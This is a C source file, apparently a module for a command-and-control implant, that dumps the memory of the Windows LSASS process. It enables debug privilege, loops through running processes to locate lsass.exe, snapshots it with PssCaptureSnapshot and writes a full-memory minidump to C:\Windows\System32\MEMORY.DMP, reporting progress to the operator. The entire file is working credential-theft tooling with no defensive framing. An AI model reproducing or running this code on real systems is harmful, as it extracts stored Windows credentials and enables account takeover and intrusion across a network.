#include "badger_exports.h"
#pragma pack(push,4)
#ifndef HPSS
#define HPSS HANDLE
#endif
#define MiniDumpWithFullMemory 0x00000002

typedef struct _MINIDUMP_MEMORY_INFO {
    ULONG64 BaseAddress;
    ULONG64 AllocationBase;
    ULONG32 AllocationProtect;
    ULONG32 __alignment1;
    ULONG64 RegionSize;
    ULONG32 State;
    ULONG32 Protect;
    ULONG32 Type;
    ULONG32 __alignment2;
} MINIDUMP_MEMORY_INFO, *PMINIDUMP_MEMORY_INFO;

typedef struct _MINIDUMP_THREAD_CALLBACK {
    ULONG ThreadId;
    HANDLE ThreadHandle;
    CONTEXT Context;
    ULONG SizeOfContext;
    ULONG64 StackBase;
    ULONG64 StackEnd;
} MINIDUMP_THREAD_CALLBACK, *PMINIDUMP_THREAD_CALLBACK;

typedef struct _MINIDUMP_THREAD_EX_CALLBACK {
    ULONG ThreadId;
    HANDLE ThreadHandle;
    CONTEXT Context;
    ULONG SizeOfContext;
    ULONG64 StackBase;
    ULONG64 StackEnd;
    ULONG64 BackingStoreBase;
    ULONG64 BackingStoreEnd;
} MINIDUMP_THREAD_EX_CALLBACK, *PMINIDUMP_THREAD_EX_CALLBACK;

typedef struct _MINIDUMP_INCLUDE_THREAD_CALLBACK {
    ULONG ThreadId;
} MINIDUMP_INCLUDE_THREAD_CALLBACK, *PMINIDUMP_INCLUDE_THREAD_CALLBACK;

typedef struct _MINIDUMP_MODULE_CALLBACK {
    PWCHAR FullPath;
    ULONG64 BaseOfImage;
    ULONG SizeOfImage;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    VS_FIXEDFILEINFO VersionInfo;
    PVOID CvRecord; 
    ULONG SizeOfCvRecord;
    PVOID MiscRecord;
    ULONG SizeOfMiscRecord;
} MINIDUMP_MODULE_CALLBACK, *PMINIDUMP_MODULE_CALLBACK;

typedef struct _MINIDUMP_INCLUDE_MODULE_CALLBACK {
    ULONG64 BaseOfImage;
} MINIDUMP_INCLUDE_MODULE_CALLBACK, *PMINIDUMP_INCLUDE_MODULE_CALLBACK;

typedef struct _MINIDUMP_IO_CALLBACK {
    HANDLE Handle;
    ULONG64 Offset;
    PVOID Buffer;
    ULONG BufferBytes;
} MINIDUMP_IO_CALLBACK, *PMINIDUMP_IO_CALLBACK;

typedef struct _MINIDUMP_READ_MEMORY_FAILURE_CALLBACK {
    ULONG64 Offset;
    ULONG Bytes;
    HRESULT FailureStatus;
} MINIDUMP_READ_MEMORY_FAILURE_CALLBACK, *PMINIDUMP_READ_MEMORY_FAILURE_CALLBACK;

typedef struct _MINIDUMP_VM_QUERY_CALLBACK {
    ULONG64 Offset;
} MINIDUMP_VM_QUERY_CALLBACK, *PMINIDUMP_VM_QUERY_CALLBACK;

typedef struct _MINIDUMP_VM_PRE_READ_CALLBACK {
    ULONG64 Offset;
    PVOID Buffer;
    ULONG Size;
} MINIDUMP_VM_PRE_READ_CALLBACK, *PMINIDUMP_VM_PRE_READ_CALLBACK;

typedef struct _MINIDUMP_VM_POST_READ_CALLBACK {
    ULONG64 Offset;
    PVOID Buffer;
    ULONG Size;
    ULONG Completed;
    HRESULT Status;
} MINIDUMP_VM_POST_READ_CALLBACK, *PMINIDUMP_VM_POST_READ_CALLBACK;

typedef struct _MINIDUMP_CALLBACK_INPUT {
    ULONG ProcessId;
    HANDLE ProcessHandle;
    ULONG CallbackType;
    union {
        HRESULT Status;
        MINIDUMP_THREAD_CALLBACK Thread;
        MINIDUMP_THREAD_EX_CALLBACK ThreadEx;
        MINIDUMP_MODULE_CALLBACK Module;
        MINIDUMP_INCLUDE_THREAD_CALLBACK IncludeThread;
        MINIDUMP_INCLUDE_MODULE_CALLBACK IncludeModule;
        MINIDUMP_IO_CALLBACK Io;
        MINIDUMP_READ_MEMORY_FAILURE_CALLBACK ReadMemoryFailure;
        ULONG SecondaryFlags;
        MINIDUMP_VM_QUERY_CALLBACK VmQuery;
        MINIDUMP_VM_PRE_READ_CALLBACK VmPreRead;
        MINIDUMP_VM_POST_READ_CALLBACK VmPostRead;
    };
} MINIDUMP_CALLBACK_INPUT, *PMINIDUMP_CALLBACK_INPUT;

typedef struct _MINIDUMP_CALLBACK_OUTPUT {
    union {
        ULONG ModuleWriteFlags;
        ULONG ThreadWriteFlags;
        ULONG SecondaryFlags;
        struct {
            ULONG64 MemoryBase;
            ULONG MemorySize;
        };
        struct {
            BOOL CheckCancel;
            BOOL Cancel;
        };
        HANDLE Handle;
        struct {
            MINIDUMP_MEMORY_INFO VmRegion;
            BOOL Continue;
        };
        struct {
            HRESULT VmQueryStatus;
            MINIDUMP_MEMORY_INFO VmQueryResult;
        };
        struct {
            HRESULT VmReadStatus;
            ULONG VmReadBytesCompleted;
        };
        HRESULT Status;
    };
} MINIDUMP_CALLBACK_OUTPUT, *PMINIDUMP_CALLBACK_OUTPUT;

typedef BOOL (WINAPI * MINIDUMP_CALLBACK_ROUTINE) (
    _Inout_ PVOID CallbackParam,
    _In_    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    _Inout_ PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
    );

typedef struct _MINIDUMP_CALLBACK_INFORMATION {
    MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
    PVOID CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION, *PMINIDUMP_CALLBACK_INFORMATION;

typedef enum {
    PSS_CAPTURE_NONE = 0x00000000,
    PSS_CAPTURE_VA_CLONE = 0x00000001,
    PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
    PSS_CAPTURE_HANDLES = 0x00000004,
    PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
    PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
    PSS_CAPTURE_THREADS = 0x00000080,
    PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
    PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
    PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
    PSS_CAPTURE_VA_SPACE = 0x00000800,
    PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
    PSS_CAPTURE_IPT_TRACE = 0x00002000,
    PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
    PSS_CREATE_BREAKAWAY = 0x08000000,
    PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
    PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
    PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
    PSS_CREATE_RELEASE_SECTION = 0x80000000
} PSS_CAPTURE_FLAGS;

WINADVAPI WINAPI NTSTATUS Ntdll$NtGetNextProcess(_In_ HANDLE, _In_ ACCESS_MASK, _In_ ULONG, _In_ ULONG, _Out_ PHANDLE);
WINADVAPI WINAPI BOOL Advapi32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI WINAPI BOOL Advapi32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
WINADVAPI WINAPI BOOL Advapi32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
WINADVAPI WINAPI BOOL Kernel32$CloseHandle(HANDLE);
WINADVAPI WINAPI DWORD Psapi$GetModuleFileNameExA(HANDLE, HMODULE, LPSTR, DWORD);
WINADVAPI WINAPI DWORD Kernel32$GetProcessId(HANDLE);
WINADVAPI WINAPI DWORD Kernel32$GetLastError();
WINADVAPI WINAPI DWORD Kernel32$PssCaptureSnapshot(HANDLE ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags, HPSS* SnapshotHandle);
WINADVAPI WINAPI HANDLE Kernel32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINADVAPI WINAPI DWORD Kernel32$PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);
WINADVAPI WINAPI char *Msvcrt$strstr(const char *s1, const char *s2);
WINADVAPI WINAPI BOOL Dbghelp$MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, ULONG_PTR, PVOID ExceptionParam, PVOID UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

BOOL CALLBACK Ex_MiniDumpWriteDumpCallback(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	switch (CallbackInput->CallbackType) {
        case 16:
            CallbackOutput->Status = S_FALSE;
            break;
	}
	return TRUE;
}

BOOL task_adjusttoken() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	if (Advapi32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		if (Advapi32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (Advapi32$AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), NULL, NULL)) {
				Kernel32$CloseHandle(hToken);
				return TRUE;
			}
		}
		Kernel32$CloseHandle(hToken);
	}
	return FALSE;
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
	WCHAR* path2dump = L"C:\\Windows\\System32\\MEMORY.DMP";
	HPSS SSHHandle = NULL;
	HMODULE ntdll_dll = NULL;
	HANDLE currprocHandle = NULL;
	HANDLE hProcess = NULL;
	DWORD l_pid = 0;

	if (!task_adjusttoken()) {
		BadgerDispatchW(dispatch, L"[-] E: Debug privilege\n");
		return;
	}

	CHAR buf[MAX_PATH];
	while (Ntdll$NtGetNextProcess(currprocHandle, MAXIMUM_ALLOWED, 0, 0, &currprocHandle) == 0) {
        for (int i = 0; i < MAX_PATH; i++) {
            buf[i] = 0;
        }
		Psapi$GetModuleFileNameExA(currprocHandle, 0, buf, MAX_PATH);
		if (Msvcrt$strstr(buf, "lsass.exe")) {
			hProcess = currprocHandle;
			l_pid = Kernel32$GetProcessId(hProcess);
			break;
		}
	}
	if (hProcess == NULL || l_pid == 0) {
		BadgerDispatchW(dispatch, L"[-] E: lsass handle\n");
		return;
	}
    BadgerDispatchW(dispatch, L"[+] Lsass: %lu\n", l_pid);

	PSS_CAPTURE_FLAGS SSH_Flags = (PSS_CAPTURE_FLAGS) (PSS_CAPTURE_VA_CLONE
		| PSS_CAPTURE_HANDLES
		| PSS_CAPTURE_HANDLE_NAME_INFORMATION
		| PSS_CAPTURE_HANDLE_BASIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TRACE
		| PSS_CAPTURE_THREADS
		| PSS_CAPTURE_THREAD_CONTEXT
		| PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
		| PSS_CREATE_BREAKAWAY
		| PSS_CREATE_BREAKAWAY_OPTIONAL
		| PSS_CREATE_USE_VM_ALLOCATIONS
		| PSS_CREATE_RELEASE_SECTION);

	DWORD checkstat = Kernel32$PssCaptureSnapshot(hProcess, SSH_Flags, CONTEXT_ALL, (HPSS*) &SSHHandle);
	if (checkstat != ERROR_SUCCESS) {
		BadgerDispatchW(dispatch, L"[-] E: %lx\n", Kernel32$GetLastError());
		Kernel32$CloseHandle(hProcess);
		return;
	}
	BadgerDispatchW(dispatch, L"[+] Snapshot captured\n");

	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = Ex_MiniDumpWriteDumpCallback;

	HANDLE hFile = Kernel32$CreateFileW(path2dump, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		BadgerDispatchW(dispatch, L"[-] E: %lu\n", Kernel32$GetLastError());
		Kernel32$CloseHandle(hProcess);
		return;
	}

	if (!Dbghelp$MiniDumpWriteDump(SSHHandle, l_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo)) {
		BadgerDispatchW(dispatch, L"[-] E: %lx\n", Kernel32$GetLastError());
	} else {
		BadgerDispatchW(dispatch, L"[+] Memory dumped to %ls\n", path2dump);
	}
	Kernel32$PssFreeSnapshot((HANDLE)-1, SSHHandle);
	Kernel32$CloseHandle(hProcess);
	Kernel32$CloseHandle(hFile);

	return;
}